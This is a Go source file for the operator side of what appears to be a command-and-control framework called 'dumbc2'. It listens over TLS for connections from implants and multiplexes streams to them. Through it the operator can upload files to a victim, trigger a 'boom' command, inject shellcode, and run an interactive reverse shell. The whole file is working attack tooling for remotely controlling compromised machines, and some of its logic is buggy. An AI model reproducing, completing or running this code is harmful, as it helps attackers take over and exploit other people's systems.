package useri

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/hashicorp/yamux"
	"github.com/kmahyyg/dumbc2/config"
	"github.com/kmahyyg/dumbc2/remoteop"
	"github.com/kmahyyg/dumbc2/transport"
	"github.com/kmahyyg/dumbc2/utils"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strings"
	"time"
)

var ymserv *yamux.Session

func StartServer(userOP config.UserOperation) {
	// server mode
	fladdr := userOP.ListenAddr
	lbserver, err := transport.TLSServerBuilder(fladdr, true)
	if err != nil {
		panic(err)
	}
	for true {
		if lbserver != nil {
			log.Println("Listen to Port Successfully, Wait for connection...")
			conn, err := lbserver.Accept()
			if err != nil {
				log.Println(err)
				continue
			}
			_ = conn.SetDeadline(time.Now().Add(time.Minute * 10))
			handleClient(conn)
		} else {
			log.Fatalln("Failed to bind.")
		}
	}
}

func handleClient(conn net.Conn) {
	// start as tls server, means it's a reverse shell
	fmt.Println("Connection established.")
	fmt.Println("Commands: upload, download, boom, bash, exit, help, shellcode.\n")
	ymconf := yamux.Config{
		AcceptBacklog:          256,
		EnableKeepAlive:        true,
		KeepAliveInterval:      time.Second * 20,
		ConnectionWriteTimeout: time.Minute * 5,
		MaxStreamWindowSize:    256 * 1024,
		LogOutput:              os.Stderr,
	}
	var err error
	ymserv, err = yamux.Server(conn, &ymconf)
	if err != nil {
		log.Fatalln(err)
	}
	cleanup := func() {
		_ = ymserv.Close()
		_ = conn.Close()
	}
	defer cleanup()
	for true {
		fmt.Printf("[SERVER] %s [>_] $ ", conn.RemoteAddr().String())
		useript := utils.ReadUserInput()
		useriptD := strings.Split(useript, " ")
		recvconn, err := ymserv.Accept()
		if err != nil {
			log.Println("Mux Error.")
			continue
		}
		userCmd := &remoteop.UserCmd{}
		err = userCmd.ParseUserInput(useriptD)
		if err == errors.New("USER_EXIT") {
			return
		} else if err != nil {
			log.Println(err)
			continue
		}
		_ = UserCommandProcess(userCmd, recvconn)
	}
}

func UserCommandProcess(ucmd *remoteop.UserCmd, ctrlstem net.Conn) error {
	var curcmdmsg *remoteop.CmdMsg
	switch ucmd.Cmd{
	case remoteop.CommandBOOM:
		curcmdmsg = &remoteop.CmdMsg{
			Status:      0,
			Cmd:         remoteop.CommandBOOM,
			Msg:         "",
			HasNext:     false,
			NextIsBin:   false,
			NextSize:    0,
			NextBinHash: "",
		}
		data, err := json.Marshal(curcmdmsg)
		if err != nil {
			log.Println(err)
			return err
		}
		_, err = ctrlstem.Write(data)
		if err != nil {
			log.Println(err)
			return err
		}
		//todo: reply parse
	case remoteop.CommandINJE:
		curcmdmsg = &remoteop.CmdMsg{
			Status:      0,
			Cmd:         remoteop.CommandINJE,
			Msg:         ucmd.OptionRMT,
			HasNext:     false,
			NextIsBin:   false,
			NextSize:    0,
			NextBinHash: "",
		}
		data, err := json.Marshal(curcmdmsg)
		if err != nil {
			log.Println(err)
			return err
		}
		_, err = ctrlstem.Write(data)
		if err != nil {
			log.Println(err)
			return err
		}
		//todo: reply parse
	case remoteop.CommandUPLD:
		data, err := ioutil.ReadFile(ucmd.OptionLCL)
		if err != nil {
			log.Println(err)
			return err
		}
		sha256hex := fmt.Sprintf("%x", sha256.Sum256(data))
		curcmdmsg = &remoteop.CmdMsg{
			Status: 		0,
			Cmd:         remoteop.CommandUPLD,
			Msg:         ucmd.OptionRMT,
			NextIsBin:   true,
			HasNext: true,
			NextSize: len(data),
			NextBinHash: sha256hex,
		}
		cmddata, err := json.Marshal(curcmdmsg)
		if err != nil {
			log.Println(err)
			return err
		}
		_, err = ctrlstem.Write(cmddata)
		if err != nil {
			log.Println(err)
			return err
		}
		//todo: parse reply
		datastem, err := ymserv.Accept()
		if err != nil {
			log.Println(err)
			return err
		}
		_, err = datastem.Write(data)
		if err != nil {
			log.Println(err)
			_ = datastem.Close()
			return err
		}
		_ = datastem.Close()
	case remoteop.CommandDWLD:

	case remoteop.CommandBASH:
		curcmdmsg = &remoteop.CmdMsg{
			Status:      0,
			Cmd:         remoteop.CommandBASH,
			Msg:         "",
			HasNext:     true,    // indicates new stream
			NextIsBin:   true,	  // indicates no json encoding
			NextSize:    -1,		// indicates dynamic content
			NextBinHash: "",
		}
		data, err := json.Marshal(curcmdmsg)
		if err != nil {
			log.Println(err)
			return err
		}
		_ , err = ctrlstem.Write(data)
		if err != nil {
			log.Println(err)
			return err
		}
		if ymserv != nil {
			datastem, err := ymserv.Accept()
			if err != nil {
				log.Println(err)
				return err
			}

			copydata := func(r io.Reader, w io.Writer) {
				_, err := io.Copy(w, r)
				if err != nil {
					log.Println(err)
				}
			}
			go copydata(datastem, os.Stdout)
			nscanner := bufio.NewScanner(os.Stdin)
			for nscanner.Scan() {
				iptdt := nscanner.Bytes()
				if bytes.Equal(iptdt, []byte("exit")) {
					iptdt = append(iptdt, []byte("\n")...)
					_, err = datastem.Write(iptdt)
					if err != nil {
						log.Println(err)
						_ = datastem.Close()
						return err
					}
					_ = datastem.Close()
					break
				} else {
					iptdt = append(iptdt, []byte("\n")...)
					_, err = datastem.Write(iptdt)
					if err != nil {
						_ = datastem.Close()
						log.Println(err)
						return err
					}
					_ = datastem.Close()
				}
			}
			return nil
		}
	default:
		log.Fatalln("Internal Error")
	}
	return nil
}
